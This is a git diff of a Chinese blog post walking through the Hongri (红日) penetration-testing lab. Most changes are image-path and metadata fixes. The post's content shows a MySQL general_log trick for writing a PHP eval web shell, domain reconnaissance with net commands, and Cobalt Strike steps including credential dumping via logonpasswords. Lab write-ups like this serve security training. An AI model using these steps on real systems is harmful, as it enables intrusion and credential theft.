@@ -20,25 +20,25 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="红日靶场 红日(一) 环境搭建 存在三台机器，win7，win2008，win2003，然后根据下面的文章进行搭建即可 不过为了方便攻击，可以将其中的NAT设置为独立的网卡，然后设置一台kali共享更好一些 [WEB安全]红日靶场（一）环境搭建_四海之水皆立的技术博客_51CTO博客 外点 nmap扫描一下 1234PORT     STATE SERVICE80&#x2F;tcp   open  http">
+    <meta name="description" content="红日靶场">
 <meta property="og:type" content="article">
 <meta property="og:title" content="红日靶场">
 <meta property="og:url" content="https://gudiffany.github.io/2023/11/02/23-58-04/index.html">
 <meta property="og:site_name" content="diffany">
-<meta property="og:description" content="红日靶场 红日(一) 环境搭建 存在三台机器，win7，win2008，win2003，然后根据下面的文章进行搭建即可 不过为了方便攻击，可以将其中的NAT设置为独立的网卡，然后设置一台kali共享更好一些 [WEB安全]红日靶场（一）环境搭建_四海之水皆立的技术博客_51CTO博客 外点 nmap扫描一下 1234PORT     STATE SERVICE80&#x2F;tcp   open  http">
+<meta property="og:description" content="红日靶场">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103002523846.png">
-<meta property="og:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103002453755.png">
-<meta property="og:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103004630673.png">
-<meta property="og:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103210331570.png">
-<meta property="og:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103234849619.png">
-<meta property="og:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103235835730.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20231103002523846.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20231103002453755.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20231103004630673.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20231103210331570.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20231103234849619.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20231103235835730.png">
 <meta property="article:published_time" content="2023-11-02T15:58:04.000Z">
-<meta property="article:modified_time" content="2023-11-03T16:13:26.695Z">
+<meta property="article:modified_time" content="2023-11-23T15:38:08.830Z">
 <meta property="article:author" content="diffany">
 <meta property="article:tag" content="内网">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gudiffany.github.io/AppData/Roaming/Typora/typora-user-images/image-20231103002523846.png">
+<meta name="twitter:image" content="https://gudiffany.github.io/img/image-20231103002523846.png">
 
 
 <link rel="canonical" href="https://gudiffany.github.io/2023/11/02/23-58-04/">
@@ -240,7 +240,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-04 00:13:26" itemprop="dateModified" datetime="2023-11-04T00:13:26+08:00">2023-11-04</time>
+      <time title="修改时间：2023-11-23 23:38:08" itemprop="dateModified" datetime="2023-11-23T23:38:08+08:00">2023-11-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -277,6 +277,7 @@
     
     <div class="post-body" itemprop="articleBody">
         <h1>红日靶场</h1>
+<span id="more"></span>
 <h2 id="红日-一">红日(一)</h2>
 <h3 id="环境搭建">环境搭建</h3>
 <p>存在三台机器，win7，win2008，win2003，然后根据下面的文章进行搭建即可</p>
@@ -288,14 +289,14 @@
 <p>存在80端口服务以及mysql数据库</p>
 <p>web服务是phpstudy探针</p>
 <p>并且在mysql链接的时候可以直接使用root/root进行链接，弱密码</p>
-<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20231103002523846.png" alt="image-20231103002523846" /></p>
+<p><img src="/img/image-20231103002523846.png" alt="image-20231103002523846" /></p>
 <p>同时dirb扫描出来存在phpmyadmin的后台</p>
-<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20231103002453755.png" alt="image-20231103002453755" /></p>
+<p><img src="/img/image-20231103002453755.png" alt="image-20231103002453755" /></p>
 <p>进入phpmyadmin的后台，可以进行查看mysql的各种配置，尝试进行提权和注入shell</p>
 <p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></p>
-<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20231103004630673.png" alt="image-20231103004630673" /></p>
+<p><img src="/img/image-20231103004630673.png" alt="image-20231103004630673" /></p>
 <p>secure_file_priv值为空，不允许读取任意文件</p>
-<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20231103210331570.png" alt="image-20231103210331570" /></p>
+<p><img src="/img/image-20231103210331570.png" alt="image-20231103210331570" /></p>
 <p>使用log进行注入，数据库存在newyxcms</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;C:\phpStudy\www\yxcms\shell.php&#x27;;</span><br><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_POST[&quot;aaa&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
 <p>然后蚁剑连接即可</p>
@@ -303,11 +304,11 @@
 <p>然后进行内网的信息收集</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all   查看本机ip，所在域</span><br><span class="line">route print     打印路由信息</span><br><span class="line">net view        查看局域网内其他主机名</span><br><span class="line">arp -a          查看arp缓存</span><br><span class="line">net start       查看开启了哪些服务</span><br><span class="line">net share       查看开启了哪些共享</span><br><span class="line">net share ipc$  开启ipc共享</span><br><span class="line">net share c$    开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;   与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;  建立c盘共享</span><br><span class="line">dir \\192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件</span><br><span class="line">​</span><br><span class="line">net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 查看本机用户列表</span><br><span class="line">net user /domain         查看域用户</span><br><span class="line">net localgroup administrators   查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         查看有几个域</span><br><span class="line">net user 用户名 /domain   获取指定域用户的信息</span><br><span class="line">net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>
 <p>发现存在的52网段，进行横向</p>
-<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20231103234849619.png" alt="image-20231103234849619" /></p>
+<p><img src="/img/image-20231103234849619.png" alt="image-20231103234849619" /></p>
 <p>首先进行CS上线操作，kali运行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.58.128 cs123456</span><br></pre></td></tr></table></figure>
 <p>主机连接之后，生成payload</p>
-<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20231103235835730.png" alt="image-20231103235835730" /></p>
+<p><img src="/img/image-20231103235835730.png" alt="image-20231103235835730" /></p>
 <p>然后进行上线</p>
 <p>之后在下面的命令行中进行信息收集和渗透</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sleep 0  // 减少回显时间</span><br><span class="line">shell whoami</span><br><span class="line">shell systeminfo //信息收集</span><br><span class="line">logonpasswords  //拿明文密码</span><br></pre></td></tr></table></figure>
